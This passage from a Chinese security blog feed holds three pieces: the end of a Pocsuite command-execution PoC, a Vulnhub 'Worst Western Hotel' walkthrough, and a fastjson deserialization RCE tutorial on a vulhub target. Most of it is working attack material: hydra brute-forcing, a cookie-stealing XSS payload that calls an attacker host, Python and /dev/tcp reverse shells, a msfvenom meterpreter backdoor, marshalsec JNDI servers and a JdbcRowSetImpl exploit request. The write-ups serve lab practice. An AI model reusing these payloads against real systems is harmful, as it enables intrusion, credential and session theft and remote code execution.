proxies=&#123;<span class="hljs-string">&#x27;https&#x27;</span>: <span class="hljs-string">&#x27;http://127.0.0.1:8080&#x27;</span>, <span class="hljs-string">&#x27;http&#x27;</span>: <span class="hljs-string">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;).json()<br>        res_body = response[<span class="hljs-string">&#x27;list&#x27;</span>][<span class="hljs-number">0</span>][<span class="hljs-string">&#x27;res_body&#x27;</span>]<br><br>        logger.debug(res_body)<br>        <span class="hljs-keyword">return</span> res_body<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_verify</span>(<span class="hljs-params">self</span>):<br>        result = &#123;&#125;<br>        param = <span class="hljs-string">&#x27;whoami&#x27;</span><br>        res = self._exploit(param)<br>        response = re.findall(<span class="hljs-string">&quot;testtest(.*?)\\ntesttest&quot;</span>,res)<br>        <span class="hljs-keyword">if</span> res != <span class="hljs-string">&#x27;&#x27;</span> :<br>            result[<span class="hljs-string">&#x27;VerifyInfo&#x27;</span>] = &#123;&#125;<br>            result[<span class="hljs-string">&#x27;VerifyInfo&#x27;</span>][<span class="hljs-string">&#x27;URL&#x27;</span>] = self.url<br>            result[<span class="hljs-string">&#x27;VerifyInfo&#x27;</span>][param] = response<br>        <span class="hljs-keyword">return</span> self.parse_output(result)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_attack</span>(<span class="hljs-params">self</span>):<br>        result = &#123;&#125;<br>        param = self.get_option(<span class="hljs-string">&#x27;cmd&#x27;</span>)<br>        res = self._exploit(param)<br>        result[<span class="hljs-string">&#x27;VerifyInfo&#x27;</span>] = &#123;&#125;<br>        result[<span class="hljs-string">&#x27;VerifyInfo&#x27;</span>][<span class="hljs-string">&#x27;URL&#x27;</span>] = self.url<br>        result[<span class="hljs-string">&#x27;VerifyInfo&#x27;</span>][param] = res[<span class="hljs-number">8</span>:-<span class="hljs-number">8</span>]<br>        <span class="hljs-keyword">return</span> self.parse_output(result)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_shell</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> self._verify()<br><br><br>register_poc(DemoPOC)<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1675316582694-0f87f52e-67a6-4ae7-9e4b-3378e2249588.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/602008/1675316615499-e076d05c-a96e-43dc-90ad-431a39115a89.png" alt="image.png"></p>]]></content>
    
    
    <categories>
      
      <category>js、mogdb_sql</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vulnhub-Worst Western Hotel</title>
    <link href="/2021/10/26/Vulnhub-WORST%20WESTERN%20HOTEL_%201/"/>
    <url>/2021/10/26/Vulnhub-WORST%20WESTERN%20HOTEL_%201/</url>
    
    <content type="html"><![CDATA[<p><a href="http://www.vulnhub.com/entry/worst-western-hotel-1,693/">Worst Western Hotel: 1</a><br>简介：<br>你的目标是开一家酒店。 :-)<br>重要提示：此框可能需要在隔离环境（仅主机网络）中运行，否则可能会中断您的内部网络。 您当然应该始终以这种方式运行下载的 vm。</p><p>暗示：</p><p>立足点受到以下漏洞之一的启发：</p><p><a href="https://www.exploit-db.com/exploits/39171">https://www.exploit-db.com/exploits/39171</a></p><p>从这个exploit-db中了解到有4种漏洞,存储型xss，SQL注入，反射性xss,，csrf漏洞<br>把网址加入hosts中<br><img src="https://cdn.nlark.com/yuque/0/2021/png/602008/1628653799721-ceeaa524-ad38-48ca-9156-9065a6a61955.png" alt="image.png"></p><p>找到靶机ip：192.168.135.143<br>nmap扫描一下：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/602008/1628653734598-589eb56f-407d-47a2-afff-99e8f3b7e995.png" alt="image.png"><br>开放了80端口和1080socks端口<br>80端口<br><img src="https://cdn.nlark.com/yuque/0/2021/png/602008/1628653885342-ced10c56-1096-4fbf-a11d-612aa92ff6e8.png" alt="image.png"><br>扫描路径<br>扫到一个登录后台<br><img src="https://cdn.nlark.com/yuque/0/2021/png/602008/1628654416748-caccfd65-3e88-47a5-bb46-20bbe2c1ce77.png" alt="image.png"><br>传统方法没法进去，继续扫描路径,扫描文件<br><img src="https://cdn.nlark.com/yuque/0/2021/png/602008/1628655514457-1d91e03a-06a1-4ab1-a9ea-0a34c7771b89.png" alt="image.png"><br>扫到一个confit.txt<br><img src="https://cdn.nlark.com/yuque/0/2021/png/602008/1628655576360-b55aa3ec-f3b4-4252-a84b-82d6e09f9ef4.png" alt="image.png"><br>提示出一个网段，一个账户，一个密码（定期更换）<br>猜测出应该是socks帐号密码,配置一下，扫描失败，密码应该不正确使用hydra爆破密码</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">hydra -l Prime -P <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt socks5:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">135.143</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/602008/1628993318075-1b127669-dc72-450e-8d8f-85901256517a.png" alt="image.png"><br>爆破成功<br><img src="https://cdn.nlark.com/yuque/0/2021/png/602008/1628993644572-e6c96f85-a925-4391-8f15-d18a6e555961.png" alt="image.png"><br>使用proxychains代理进入内网，先设置socks5协议<br><img src="https://cdn.nlark.com/yuque/0/2021/png/602008/1628993760426-184ef267-805e-4558-8637-db21a9d044b9.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/602008/1628993793339-73916e50-5b67-4893-82dc-7aa462eb2f72.png" alt="image.png"><br>设置完成后，使用nmap扫描目标内网存活主机(192.1680.0.1&#x2F;24)</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">proxychains</span> nmap -sn <span class="hljs-number">192.168.0.1</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p>扫到地址<br><img src="https://cdn.nlark.com/yuque/0/2021/png/602008/1628998248771-833f4e89-8ffc-4609-b3b4-a2174e8af147.png" alt="image.png"><br>扫描192.168.1.124<br><img src="https://cdn.nlark.com/yuque/0/2021/png/602008/1628998306071-1e62eb65-eebb-4a6f-8827-5f22f6113707.png" alt="image.png"><br>设置<img src="https://cdn.nlark.com/yuque/0/2021/png/602008/1628998588894-75dc16a1-eb83-42ef-9117-62c1f9ab21c0.png" alt="image.png"><br>firefox设置<br><img src="https://cdn.nlark.com/yuque/0/2021/png/602008/1628998656327-1f477e06-5ef0-4161-b675-69ca205010d4.png" alt="image.png"><br>进入<br><img src="https://cdn.nlark.com/yuque/0/2021/png/602008/1628998687705-15f0dec0-5106-4f68-9f5d-8b23887fc753.png" alt="image.png"><br>一个登录页面没有其他东西，测试了SQL注入发现不存在注入，想起之前提示过存储xss，实验以下<br>XSS语句</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">&lt;script&gt;location.href=&quot;<span class="hljs-link">http://192.168.135.135/?cookie=&quot;+document</span>[<span class="hljs-string">&#x27;cookie&#x27;</span>]&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/602008/1628999341603-32b98a81-797d-451c-8e79-d8f724dfd4cb.png" alt="image.png"><br>使用python搭建一个http服务器，通过代理搭建，使内网的数据能反弹到本机上</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">proxychains</span> python3 -m http.server <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/602008/1628999489421-e95a85d7-a5fa-4223-82d5-17479bf1aad8.png" alt="image.png"><br>反弹成功<br><img src="https://cdn.nlark.com/yuque/0/2021/png/602008/1628999546719-36befc27-65fb-48bb-bbf9-e6830a06139a.png" alt="image.png"><br>替换cookie加入后台<br><img src="https://cdn.nlark.com/yuque/0/2021/png/602008/1628999628695-938584d9-fa3f-4cc3-a096-b6579f34a073.png" alt="image.png"></p><p>进入之后删除<script>标签，要不然会跳转页面<br><img src="https://cdn.nlark.com/yuque/0/2021/png/602008/1628999956835-a10ab395-8dea-4539-a765-9f839acaa52c.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/602008/1628999993788-023a77f8-1b97-415e-a50e-0245e4933ce2.png" alt="image.png"><br>在原代码找到几个图片地址<br><img src="https://cdn.nlark.com/yuque/0/2021/png/602008/1629000062872-5b7e3b40-f478-46d8-90ff-681ce0d8284b.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/602008/1629000097953-c5737f92-ebae-4597-889b-943c7521054d.png" alt="image.png"><br>找到一张，放大发现帐号密码<br><img src="https://cdn.nlark.com/yuque/0/2021/png/602008/1629000137253-e8d7cbbc-ee6e-494d-abeb-48b1fe015a28.png" alt="image.png"></p><p>帐号:peterg  密码:Birdistheword<br>在之前扫到过一个后台管理地址，登录看看<br><img src="https://cdn.nlark.com/yuque/0/2021/png/602008/1629165305073-8c32cdd0-b8cf-4f9e-bbf7-f3448578bb1a.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/602008/1629165339731-34f61503-696d-4219-a0a0-a9e471a1f985.png" alt="image.png"><br>提示输入一个有效的电子地址，在这个地方卡了好久，最后找到作者通关文章里才知道邮箱后缀名，就是标题<br><img src="https://cdn.nlark.com/yuque/0/2021/png/602008/1629165433771-620f4e7c-a2c9-4ace-bed8-d6aeb62dbfa5.png" alt="image.png"><br>登录后台</p><p>在修改主题出上传shell，现将主题下载到本地，在本地中index.php文件添加shell<br><img src="https://cdn.nlark.com/yuque/0/2021/png/602008/1629165804782-46e5c5d3-15ca-4be5-a2e0-a86bb719f2ac.png" alt="image.png"><br>然后删除主题，重新上传主题。上传成功后shell位置在<br><a href="https://prime.worstwestern.com/themes/hotel-reservation-theme/index.php?cmd=id">https://prime.worstwestern.com/themes/hotel-reservation-theme/index.php?cmd=id</a><br>反弹shell到本机<br><img src="https://cdn.nlark.com/yuque/0/2021/png/602008/1629166534313-bcbf889c-e15f-4ac1-baad-767fd72ea3c2.png" alt="image.png"><br>本机监听着。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://prime.worstwestern.com/themes/hotel-reservation-theme/index.php?cmd=python%<span class="hljs-number">20</span>-c%<span class="hljs-number">20</span>%<span class="hljs-number">27</span>import%<span class="hljs-number">20</span>socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%<span class="hljs-number">22192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">135</span>.<span class="hljs-number">135</span>%<span class="hljs-number">22</span>,<span class="hljs-number">4444</span>));os.dup2(s.fileno(),<span class="hljs-number">0</span>);%<span class="hljs-number">20</span>os.dup2(s.fileno(),<span class="hljs-number">1</span>);%<span class="hljs-number">20</span>os.dup2(s.fileno(),<span class="hljs-number">2</span>);p=subprocess.call([%<span class="hljs-number">22</span>/bin/bash%<span class="hljs-number">22</span>,%<span class="hljs-number">22</span>-i%<span class="hljs-number">22</span>]);%<span class="hljs-number">27</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.135.135&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/602008/1629166657069-b96d40bc-d5f4-4d2d-9bd5-836c4e74ee6c.png" alt="image.png"><br>反弹成功，保证shell的稳定性，使用msfvenom生成一个linux后门</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.135.135 LPORT=5566 -f elf &gt; shell.elf<br></code></pre></td></tr></table></figure><p>python开启网络服务，反弹shell处执行wget把文件下载下来，加上相应的执行权限。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/602008/1629166878565-f8bbf7eb-d2b4-4ef1-8129-db1be822e061.png" alt="image.png"><br>这边开启msfconsole监听<br><img src="https://cdn.nlark.com/yuque/0/2021/png/602008/1629167071625-883b7855-f534-4030-94f1-c45489a949cc.png" alt="image.png"><br>成功反弹<br>发现存在第二个网段<br>192.168.0.100<br><img src="https://cdn.nlark.com/yuque/0/2021/png/602008/1629167296259-05824b47-2101-4bff-891b-148fe5752361.png" alt="image.png"><br>使用meterpreter添加路由<br>自动添加路由</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">use post/multi/manage/autoroute <br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/602008/1629168795953-4f270c89-b9d3-4c11-bc0d-1a4ffc766f87.png" alt="image.png"><br>代理设置好以后，添加socks监控隧道为其他程序使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">use auxiliary/server/socks_proxy<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/602008/1629169049807-40774aa5-abf6-40fb-8294-f6868c53c788.png" alt="image.png"><br>修改本地proxychains配置</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/602008/1629169121078-20dba84c-09c3-4daa-bb57-02cfc158b072.png" alt="image.png"><br>使用nmap探测主机<img src="https://cdn.nlark.com/yuque/0/2021/png/602008/1629169751087-643aba68-ed07-4969-b544-a5140330963b.png" alt="image.png"><br>对192.168.0.1进行详细探测<br><img src="https://cdn.nlark.com/yuque/0/2021/png/602008/1629170046390-a489915a-d512-4bb4-b193-8afedf529f4d.png" alt="image.png"><br>443上开放着web服务<br>访问一下</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/602008/1629170150446-4ed52eab-b70e-43db-a6f6-872e6dae5951.png" alt="image.png">发现访问失败，使用portfwd转发端口<br><img src="https://cdn.nlark.com/yuque/0/2021/png/602008/1629170851147-d2c887e3-c321-4aad-b7fd-58fd7c7ea275.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/602008/1629170648585-1160062d-c1ca-4cf9-b57a-eee464222ab6.png" alt="image.png"><br>是一个登录页面，想起前面提示可能存在sql注入<br>无法抓包<br>使用 sqlmap -u "<a href="http://192.168.160.1/sqltest/post.php%22">"</a> --forms  自动搜索注入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;https://192.168.135.135:3333/index.php&quot;</span> --forms --batch<br><br></code></pre></td></tr></table></figure><p>注入出<br><img src="https://cdn.nlark.com/yuque/0/2021/png/602008/1629171122586-c67dd9bc-3c0f-4b2d-a292-68cabb1f2545.png" alt="image.png"><br>发现emain列中很像ssh的密码登录链接<br><img src="https://cdn.nlark.com/yuque/0/2021/png/602008/1629171249087-fa932ce6-e85b-4519-8e64-f5f8c3e59e1c.png" alt="image.png"><br>使用<a href="https://github.com/carlospolop/PEASS-ng">https://github.com/carlospolop/PEASS-ng</a>来枚举可提取权操作</p><p>上传上去开始运行<br><img src="https://cdn.nlark.com/yuque/0/2021/png/602008/1629172114987-bf281d0c-0b7a-4b54-9acf-c4c55bf04d7d.png" alt="image.png"><br><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a><br>找到php提权方法<br><img src="https://cdn.nlark.com/yuque/0/2021/png/602008/1629172751588-b05f3029-8f10-473d-9547-baf8cbae5291.png" alt="image.png"><br>提权成功<br><img src="https://cdn.nlark.com/yuque/0/2021/png/602008/1629172712642-02967555-8ed3-45c5-8d81-a3e8cb49864f.png" alt="image.png"></p>]]></content>
    
    
    <categories>
      
      <category>Vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶机实战</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fastjson漏洞</title>
    <link href="/2021/07/10/fastjson/"/>
    <url>/2021/07/10/fastjson/</url>
    
    <content type="html"><![CDATA[<h1 id="fastjson反序列化RCE"><a href="#fastjson反序列化RCE" class="headerlink" title="fastjson反序列化RCE"></a>fastjson反序列化RCE</h1><h2 id="0x01-漏洞介绍"><a href="#0x01-漏洞介绍" class="headerlink" title="0x01 漏洞介绍"></a>0x01 漏洞介绍</h2><p>Fastjson是阿里巴巴公司开源的一款json解析器，其性能优越，被广泛应用于各大厂商的Java项目中。fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。</p><p>fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set&#x2F;get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。</p><h2 id="0x02-影响范围"><a href="#0x02-影响范围" class="headerlink" title="0x02 影响范围"></a>0x02 影响范围</h2><p>Fastjson &lt; 1.2.68</p><p>Fastjson爆出的绕过方法可以通杀1.2.68版本以下所有</p><h2 id="0x03-漏洞利用过程"><a href="#0x03-漏洞利用过程" class="headerlink" title="0x03 漏洞利用过程"></a>0x03 漏洞利用过程</h2><h3 id="流程示意图"><a href="#流程示意图" class="headerlink" title="流程示意图"></a>流程示意图</h3><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDQxMTE3NDUucG5n?x-oss-process=image/format,png" alt="image-20200704111745527"></p><p>主机A：存在fastjson反序列化漏洞的主机<br>主机C：为RMI&#x2F;LDAP服务<br>主机B：为构造的恶意类（包含要执行的命令）</p><h3 id="在整个远程命令执行流程"><a href="#在整个远程命令执行流程" class="headerlink" title="在整个远程命令执行流程"></a>在整个远程命令执行流程</h3><p>1、黑客使用payload攻击主机A（该payload需要指定rmi&#x2F;ldap地址）</p><p>2、主机A引发反序列化漏洞，发送了进行rmi远程发放调用，去连接主机C</p><p>3、主机C的rmi服务指定加载主机B的恶意java类，所以主机A通过主机C的rmi服务最终加载并执行主机B的恶意java类</p><p>4、主机A引发恶意系统命令执行</p><ul><li><p>服务器上搭建可以访问的恶意class类</p></li><li><p>rmi服务指定B的java.class恶意类，将json数据当命令执行</p></li><li><p>发送恶意拼接的json数据，访问rmi服务</p><p>发送恶意请求 —&gt; 访问rmi服务 —&gt; 调用恶意class类 —-&gt; 执行命令</p></li></ul><h2 id="0x04-复习过程"><a href="#0x04-复习过程" class="headerlink" title="0x04 复习过程"></a>0x04 复习过程</h2><p>在vulhub上开启靶机</p><p><img src="https://my-hexo-z.oss-cn-beijing.aliyuncs.com/images/image-20211004221322636.png" alt="image-20211004221322636"></p><p>访问成功</p><h3 id="构造恶意方法"><a href="#构造恶意方法" class="headerlink" title="构造恶意方法"></a>构造恶意方法</h3><p>使用RMI进行命令执行</p><p><strong>注意</strong>：文件名得叫Exploit，不能改变</p><p>payload：touch &#x2F;zydx666处</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Exploit</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Process</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;touch /zydx666&quot;</span>&#125;);<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> p.getInputStream();<br>        <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(is));<br><br>        String line;<br>        <span class="hljs-keyword">while</span>((line = reader.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>            System.out.println(line);<br>        &#125;<br><br>        p.waitFor();<br>        is.close();<br>        reader.close();<br>        p.destroy();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>使用javac命令编译Exploit.java文件，生成Exploit.class文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs base">javac Exploit.java<br></code></pre></td></tr></table></figure><p><img src="https://my-hexo-z.oss-cn-beijing.aliyuncs.com/images/image-20211004222637763.png" alt="image-20211004222637763"></p><p>然后开启http服务，需要访问到Exploit.class文件，这里使用python3临时启动一个</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 -m http.server --<span class="hljs-built_in">bind</span> 0.0.0.0 8888<br></code></pre></td></tr></table></figure><h3 id="开启远程方法调用rmi服务"><a href="#开启远程方法调用rmi服务" class="headerlink" title="开启远程方法调用rmi服务"></a>开启远程方法调用rmi服务</h3><p>下载方法<a href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a></p><p><img src="https://my-hexo-z.oss-cn-beijing.aliyuncs.com/images/image-20211004222915085.png" alt="image-20211004222915085"></p><p>下载完成后进入marshalsec目录下使用maven进行打包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mvn clean package -DskipTests<br></code></pre></td></tr></table></figure><p><img src="https://my-hexo-z.oss-cn-beijing.aliyuncs.com/images/image-20211004161059142.png" alt="image-20211004161059142"></p><p>将target下的marshalsec-0.0.3-SNAPSHOT-all.jar文件移动出来</p><p>可以使用RMI或者LDAP的服务，将reference result 重定向到web服务器（即文件Exploit.class的存放位置）。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -cp marshalsec-<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>-SNAPSHOT-<span class="hljs-literal">all</span>.jar marshalsec.jndi.RMIRefServer <span class="hljs-string">&quot;http://x.x.x.x/#Exploit&quot;</span> <span class="hljs-number">9999</span><br><span class="hljs-attribute">java</span> -cp marshalsec-<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>-SNAPSHOT-<span class="hljs-literal">all</span>.jar marshalsec.jndi.LDAPRefServer <span class="hljs-string">&quot;http://x.x.x.x/#Exploit&quot;</span> <span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure><p>这里我们使用第一种方法</p><p><img src="https://my-hexo-z.oss-cn-beijing.aliyuncs.com/images/image-20211004223309812.png" alt="image-20211004223309812"></p><p>至此服务已经全部就绪</p><h3 id="发送payload"><a href="#发送payload" class="headerlink" title="发送payload"></a>发送payload</h3><p>接下来向靶机发送fastjson反序列化漏洞payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.86.128:8090<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=6AF335C05955D545BA912E8274B161DA<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>162<br><br><span class="language-json"><span class="hljs-punctuation">&#123;</span></span><br><span class="language-json">    <span class="hljs-attr">&quot;b&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span></span><br><span class="language-json">        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span></span><br><span class="language-json">        <span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;rmi://192.168.86.129:7777/Exploit&quot;</span><span class="hljs-punctuation">,</span></span><br><span class="language-json">        <span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span></span><br><span class="language-json">    <span class="hljs-punctuation">&#125;</span></span><br><span class="language-json"><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure><p><img src="https://my-hexo-z.oss-cn-beijing.aliyuncs.com/images/image-20211004223625845.png" alt="image-20211004223625845"></p><p>此时靶机接到POST请求，触发反序了漏洞，最终去执行Exploit.class 文件中的内容</p><p>我这里使用反弹shell命令</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Exploit</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Process</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;exec 5&lt;&gt;/dev/tcp/192.168.86.128/5000;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>&#125;);<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> p.getInputStream();<br>        <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span 